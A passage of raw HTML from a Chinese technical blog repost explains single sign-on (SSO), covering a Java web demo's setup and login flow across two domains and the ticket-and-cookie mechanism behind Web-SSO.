<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">/setCookie</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       如果域名或端口号和我的不一致，可以修改对应配置项。最后部署到应用服务器中，启动服务器。</span>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>SSO使用</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       首先输入第一个应用系统的访问地址，http://web1.com:8080/WebSSODemo/index.jsp，如果是第一次访问的话，会自动跳转到登录页，如下图：<img src="http://img.blog.csdn.net/20140305154755140?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       系统中内置了3个用户，张三、李四、王五，用户名和密码皆为拼音全拼，输入zhangsan/zhangsan登录后，会自动跳转到我们刚才访问的页面，页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140305154843171?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /><br />&#13;
</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       这时，我们再输入第二个应用系统的访问地址，http://web2.com:8080/WebSSODemo/index.jsp，我们发现，没有进行第二次登录，同样页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140305154930046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       我们接着点击Logout注销用户，页面跳转到了登录页面，这时我们再回头访问第一个应用系统的页面，发现同样跳转到了登录页面。<br />&#13;
       互联网中的完全跨域登录的站点也有很多，如<a target="_blank" href="http://www.taobao.com/" style="text-decoration:none; color:rgb(12,137,207)">淘宝</a>和<a target="_blank" href="http://www.tmall.com/" style="text-decoration:none; color:rgb(12,137,207)">天猫</a>，但肯定不是我这样实现的。我的实现中，认证系统和应用系统是通过url参数来传递ticket，可能存在一些不稳定因素。应用系统的每次请求都会通过HTTP远程到认证系统进行验证ticket，速度上应该会慢一些，这里可以改进一步，在每个应用系统中也维护一份tickets，验证时，首先到本系统中验证，如果不存在，再远程到认证系统进行验证，但这也增加了应用系统的代码量</p>&#13;
<br />&#13;
</div>&#13;
<div><br />&#13;
</div>&#13;
<div>转自：<a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" style="text-decoration:none; color:rgb(12,137,207); font-family:'microsoft yahei'; font-size:15px; line-height:35px">http://blog.csdn.net/ghsau/article/details/20545513</a></div>&#13;
<div><br />&#13;
</div>&#13;
<h1>单点登录的原理</h1>&#13;
<div><br />&#13;
</div>&#13;
<div><span style="font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:13px; line-height:21px"></span>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><span style="font-size:12pt">摘要</span></strong><span style="font-size:12pt">：单点登录（</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">）的技术被越来越广泛地运用到各个领域的软件系统当中。本文从业务的角度分析了单点登录的需求和应用领域；从技术本身的角度分析了单点登录技术的内部机制和实现手段，并且给出</span><span style="font-size:12pt">Web-SSO</span><span style="font-size:12pt">和桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的实现、源代码和详细讲解；还从安全和性能的角度对现有的实现技术进行进一步分析，指出相应的风险和需要改进的方面。本文除了从多个方面和角度给出了对单点登录（</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">）的全面分析，还并且讨论了如何将现有的应用和</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">服务结合起来，能够帮助应用架构师和系统分析人员从本质上认识单点登录，从而更好地设计出符合需要的安全架构。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><span style="font-size:12pt">关键字</span></strong><span style="font-size:12pt">：</span><span style="font-size:12pt">SSO, Java, J2EE, JAAS</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">1 </span><span style="font-size:14pt">什么是单点登陆</span></em></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">单点登录（</span><span style="font-size:12pt">Single Sign On</span><span style="font-size:12pt">），简称为 </span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，是目前比较流行的企业业务整合的解决方案之一。</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的定义是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">较大的企业内部，一般都有很多的业务支持系统为其提供相应的管理和</span><span style="font-size:12pt">IT</span><span style="font-size:12pt">服 务。例如财务系统为财务人员提供财务的管理、计算和报表服务；人事系统为人事部门提供全公司人员的维护服务；各种业务系统为公司内部不同的业务提供不同的&#13;
 服务等等。这些系统的目的都是让计算机来进行复杂繁琐的计算工作，来替代人力的手工劳动，提高工作效率和质量。这些不同的系统往往是在不同的时期建设起来 的，运行在不同的平台上；也许是由不同厂商开发，使用了各种不同的技术和标准。如果举例说国内一著名的</span><span style="font-size:12pt">IT</span><span style="font-size:12pt">公司（名字隐去），内部共有</span><span style="font-size:12pt">60</span><span style="font-size:12pt">多个业务系统，这些系统包括两个不同版本的</span><span style="font-size:12pt">SAP</span><span style="font-size:12pt">的</span><span style="font-size:12pt">ERP</span><span style="font-size:12pt">系统，</span><span style="font-size:12pt">12</span><span style="font-size:12pt">个不同类型和版本的数据库系统，</span><span style="font-size:12pt">8</span><span style="font-size:12pt">个不同类型和版本的操作系统，以及使用了</span><span style="font-size:12pt">3</span><span style="font-size:12pt">种不同的防火墙技术，还有数十种互相不能兼容的协议和标准，你相信吗？不要怀疑，这种情况其实非常普遍。每一个应用系统在运行了数年以后，都会成为不可替换的企业</span><span style="font-size:12pt">IT</span><span style="font-size:12pt">架构的一部分，如下图所示。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image002.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">随 着企业的发展，业务系统的数量在不断的增加，老的系统却不能轻易的替换，这会带来很多的开销。其一是管理上的开销，需要维护的系统越来越多。很多系统的数 据是相互冗余和重复的，数据的不一致性会给管理工作带来很大的压力。业务和业务之间的相关性也越来越大，例如公司的计费系统和财务系统，财务系统和人事系 统之间都不可避免的有着密切的关系。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">为了降低管理的消耗，最大限度的重用已有投资的系统，很多企业都在进行着企业应用集成（</span><span style="font-size:12pt">EAI</span><span style="font-size:12pt">）。 企业应用集成可以在不同层面上进行：例如在数据存储层面上的“数据大集中”，在传输层面上的“通用数据交换平台”，在应用层面上的“业务流程整合”，和用&#13;
 户界面上的“通用企业门户”等等。事实上，还用一个层面上的集成变得越来越重要，那就是“身份认证”的整合，也就是“单点登录”。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">通常来说，每个单独的系统都会有自己的安全体系和身份认证系统。整合以前，进入每个系统都需要进行登录，这样的局面不仅给管理上带来了很大的困难，在安全方面也埋下了重大的隐患。下面是一些著名的调查公司显示的统计数据：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">用户每天平均 <strong>16 </strong>分钟花在身份验证任务上 <strong>- </strong><em>资料来源： IDS</em></span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">频繁的 <strong>IT </strong>用户平均有 <strong>21 </strong>个密码 <strong>- </strong><em>资料来源： NTA Monitor Password Survey</em></span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><strong><span style="font-size:10pt">49% </span></strong><span style="font-size:10pt">的人写下了其密码，而 <strong>67% </strong>的人很少改变它们</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">每 <strong>79 </strong>秒出现一起身份被窃事件 <strong>- </strong><em>资料来源：National Small Business Travel Assoc</em></span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">全球欺骗损失每年约 <strong>12B - </strong><em>资料来源：Comm Fraud Control Assoc</em></span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">到 <strong>2007 </strong>年，身份管理市场将成倍增长至 <strong>$4.5B - </strong><em>资料来源：IDS</em></span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">使用“单点登录”整合后，只需要登录一次就可以进入多个系统，而不需要重新登录，这不仅仅带来了更好的用户体验，更重要的是降低了安全的风险和管理的消耗。请看下面的统计数据：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">提高 <strong>IT </strong>效率：对于每 <strong>1000 </strong>个受管用户，每用户可节省<strong>$70K</strong></span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">帮助台呼叫减少至少<strong>1/3</strong>，对于 <strong>10K </strong>员工的公司，每年可以节省每用户 <strong>$75</strong>，或者合计 <strong>$648K</strong></span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:10pt">生产力提高：每个新员工可节省 <strong>$1K</strong>，每个老员工可节省 <strong>$350 </strong></span><strong><span style="font-size:10pt">�</span></strong><em><span style="font-size:10pt">资料来源：Giga</span></em></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><strong><span style="font-size:10pt">ROI </span></strong><span style="font-size:10pt">回报：<strong>7.5 </strong>到 <strong>13 </strong>个月 </span><span style="font-size:10pt">�</span><em><span style="font-size:10pt">资料来源：Gartner</span></em></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">另外，使用“单点登录”还是</span><span style="font-size:12pt">SOA</span><span style="font-size:12pt">时代的需求之一。在面向服务的架构中，服务和服务之间，程序和程序之间的通讯大量存在，服务之间的安全认证是</span><span style="font-size:12pt">SOA</span><span style="font-size:12pt">应用的难点之一，应此建立“单点登录”的系统体系能够大大简化</span><span style="font-size:12pt">SOA</span><span style="font-size:12pt">的安全问题，提高服务之间的合作效率。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">2 </span><span style="font-size:14pt">单点登陆的技术实现机制</span></em></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">随着</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">技术的流行，</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的产品也是满天飞扬。所有著名的软件厂商都提供了相应的解决方案。在这里我并不想介绍自己公司（</span><span style="font-size:12pt">Sun&#13;
 Microsystems</span><span style="font-size:12pt">）的产品，而是对</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">技术本身进行解析，并且提供自己开发这一类产品的方法和简单演示。有关我写这篇文章的目的，请参考我的博客（</span><span style="font-size:12pt"><a target="_blank" href="http://yuwang881.blog.sohu.com/" style="color:rgb(119,0,0); text-decoration:none"><span style="font-size:10pt">http://yuwang881.blog.sohu.com/3184816.html</span></a></span><span style="font-size:12pt">）。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">单 点登录的机制其实是比较简单的，用一个现实中的例子做比较。颐和园是北京著名的旅游景点，也是我常去的地方。在颐和园内部有许多独立的景点，例如“苏州 街”、“佛香阁”和“德和园”，都可以在各个景点门口单独买票。很多游客需要游玩所有德景点，这种买票方式很不方便，需要在每个景点门口排队买票，钱包拿 进拿出的，容易丢失，很不安全。于是绝大多数游客选择在大门口买一张通票（也叫套票），就可以玩遍所有的景点而不需要重新再买票。他们只需要在每个景点门&#13;
 口出示一下刚才买的套票就能够被允许进入每个独立的景点。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">单点登录的机制也一样，如下图所示，当用户第一次访问应用系统</span><span style="font-size:12pt">1</span><span style="font-size:12pt">的时候，因为还没有登录，会被引导到认证系统中进行登录（</span><span style="font-size:12pt">1</span><span style="font-size:12pt">）；根据用户提供的登录信息，认证系统进行身份效验，如果通过效验，应该返回给用户一个认证的凭据－－</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">（</span><span style="font-size:12pt">2</span><span style="font-size:12pt">）；用户再访问别的应用的时候（</span><span style="font-size:12pt">3</span><span style="font-size:12pt">，</span><span style="font-size:12pt">5</span><span style="font-size:12pt">）就会将这个</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">带上，作为自己认证的凭据，应用系统接受到请求之后会把</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">送到认证系统进行效验，检查</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">的合法性（</span><span style="font-size:12pt">4</span><span style="font-size:12pt">，</span><span style="font-size:12pt">6</span><span style="font-size:12pt">）。如果通过效验，用户就可以在不用再次登录的情况下访问应用系统</span><span style="font-size:12pt">2</span><span style="font-size:12pt">和应用系统</span><span style="font-size:12pt">3</span><span style="font-size:12pt">了。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image004.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">从上面的视图可以看出，要实现</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，需要以下主要的功能：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">所有应用系统共享一个身份认证系统。</span><span style="font-size:12pt"><br />&#13;
</span><span style="font-size:12pt">统一的认证系统是</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的前提之一。认证系统的主要功能是将用户的登录信息和用户信息库相比较，对用户进行登录认证；认证成功后，认证系统应该生成统一的认证标志（</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">），返还给用户。另外，认证系统还应该对</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">进行效验，判断其有效性。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">所有应用系统能够识别和提取</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">信息</span><span style="font-size:12pt"><br />&#13;
</span><span style="font-size:12pt">要实现</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的功能，让用户只登录一次，就必须让应用系统能够识别已经登录过的用户。应用系统应该能对</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">进行识别和提取，通过与认证系统的通讯，能自动判断当前用户是否登录过，从而完成单点登录的功能。</span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">上面的功能只是一个非常简单的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">架构，在现实情况下的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">有着更加复杂的结构。有两点需要指出的是：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">单一的用户信息数据库并不是必须的，有许多系统不能将所有的用户信息都集中存储，应该允许用户信息放置在不同的存储中，如下图所示。事实上，只要统一认证系统，统一</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">的产生和效验，无论用户信息存储在什么地方，都能实现单点登录。</span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> <img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image006.gif" style="border:0px" /></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">统一的认证系统并不是说只有单个的认证服务器，如下图所示，整个系统可以存在两个以上的认证服务器，这些服务器甚至可以是不同的产品。认证服务器之间要通过标准的通讯协议，互相交换认证信息，就能完成更高级别的单点登录。如下图，当用户在访问应用系统</span><span style="font-size:12pt">1</span><span style="font-size:12pt">时，由第一个认证服务器进行认证后，得到由此服务器产生的</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">。当他访问应用系统</span><span style="font-size:12pt">4</span><span style="font-size:12pt">的时候，认证服务器</span><span style="font-size:12pt">2</span><span style="font-size:12pt">能够识别此</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">是由第一个服务器产生的，通过认证服务器之间标准的通讯协议（例如</span><span style="font-size:12pt">SAML</span><span style="font-size:12pt">）来交换认证信息，仍然能够完成</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的功能。</span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> <img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image008.gif" style="border:0px" /></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">3 WEB-SSO</span><span style="font-size:14pt">的实现</span></em></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">随着互联网的高速发展，</span><span style="font-size:12pt">WEB</span><span style="font-size:12pt">应用几乎统治了绝大部分的软件应用系统，因此</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">是</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">应用当中最为流行。</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">有其自身的特点和优势，实现起来比较简单易用。很多商业软件和开源软件都有对</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">的实现。其中值得一提的是</span><span style="font-size:12pt">OpenSSO </span><span style="font-size:12pt">（</span><span style="font-size:12pt"><a target="_blank" href="https://opensso.dev.java.net/" style="color:rgb(119,0,0); text-decoration:none">https://opensso.dev.java.net</a></span><span style="font-size:12pt">），为用</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">实现</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">提供架构指南和服务指南，为用户自己来实现</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">提供了理论的依据和实现的方法。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">为什么说</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">比较容易实现呢？这是有</span><span style="font-size:12pt">WEB</span><span style="font-size:12pt">应用自身的特点决定的。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">众所周知，</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">协议（也就是</span><span style="font-size:12pt">HTTP</span><span style="font-size:12pt">）是一个无状态的协议。一个</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用由很多个</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">页面组成，每个页面都有唯一的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">来定义。用户在浏览器的地址栏输入页面的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">，浏览器就会向</span><span style="font-size:12pt">Web&#13;
 Server</span><span style="font-size:12pt">去发送请求。如下图，浏览器向</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器发送了两个请求，申请了两个页面。这两个页面的请求是分别使用了两个单独的</span><span style="font-size:12pt">HTTP</span><span style="font-size:12pt">连接。所谓无状态的协议也就是表现在这里，浏览器和</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器会在第一个请求完成以后关闭连接通道，在第二个请求的时候重新建立连接。</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器并不区分哪个请求来自哪个客户端，对所有的请求都一视同仁，都是单独的连接。这样的方式大大区别于传统的（</span><span style="font-size:12pt">Client/Server</span><span style="font-size:12pt">）</span><span style="font-size:12pt">C/S</span><span style="font-size:12pt">结构</span><span style="font-size:12pt">,</span><span style="font-size:12pt">在那样的应用中，客户端和服务器端会建立一个长时间的专用的连接通道。正是因为有了无状态的特性，每个连接资源能够很快被其他客户端所重用，一台</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器才能够同时服务于成千上万的客户端。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image010.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">但是我们通常的应用是有状态的。先不用提不同应用之间的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，在同一个应用中也需要保存用户的登录身份信息。例如用户在访问页面</span><span style="font-size:12pt">1</span><span style="font-size:12pt">的时候进行了登录，但是刚才也提到，客户端的每个请求都是单独的连接，当客户再次访问页面</span><span style="font-size:12pt">2</span><span style="font-size:12pt">的时候，如何才能告诉</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器，客户刚才已经登录过了呢？浏览器和服务器之间有约定：通过使用</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">技术来维护应用的状态。</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">是可以被</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器设置的字符串，并且可以保存在浏览器中。如下图所示，当浏览器访问了页面</span><span style="font-size:12pt">1</span><span style="font-size:12pt">时，</span><span style="font-size:12pt">web</span><span style="font-size:12pt">服务器设置了一个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">，并将这个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">和页面</span><span style="font-size:12pt">1</span><span style="font-size:12pt">一起返回给浏览器，浏览器接到</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">之后，就会保存起来，在它访问页面</span><span style="font-size:12pt">2</span><span style="font-size:12pt">的时候会把这个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">也带上，</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器接到请求时也能读出</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的值，根据</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">值的内容就可以判断和恢复一些用户的信息状态。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image012.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">Web-SSO</span><span style="font-size:12pt">完全可以利用</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">结束来完成用户登录信息的保存，将浏览器中的</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">和上文中的</span><span style="font-size:12pt">Ticket</span><span style="font-size:12pt">结合起来，完成</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的功能。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">为了完成一个简单的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的功能，需要两个部分的合作：</span></div>&#13;
<ol type="1" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">统一的身份认证服务。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">修改</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用，使得每个应用都通过这个统一的认证服务来进行身份效验。</span></li></ol>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><span style="font-size:13.5pt">3.1 Web SSO </span><span style="font-size:13.5pt">的样例</span></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">根据上面的原理，我用</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">的技术（</span><span style="font-size:12pt">JSP</span><span style="font-size:12pt">和</span><span style="font-size:12pt">Servlet</span><span style="font-size:12pt">）完成了一个具有</span><span style="font-size:12pt">Web-SSO</span><span style="font-size:12pt">的简单样例。样例包含一个身份认证的服务器和两个简单的</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用，使得这两个 </span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用通过统一的身份认证服务来完成</span><span style="font-size:12pt">Web-SSO</span><span style="font-size:12pt">的功能。此样例所有的源代码和二进制代码都可以从网站地址</span><span style="font-size:12pt"><a target="_blank" href="http://gceclub.sun.com.cn/wangyu/" style="color:rgb(119,0,0); text-decoration:none">http://gceclub.sun.com.cn/wangyu/</a> </span><span style="font-size:12pt">下载。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><span style="font-size:12pt">样例下载、安装部署和运行指南：</span></strong></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
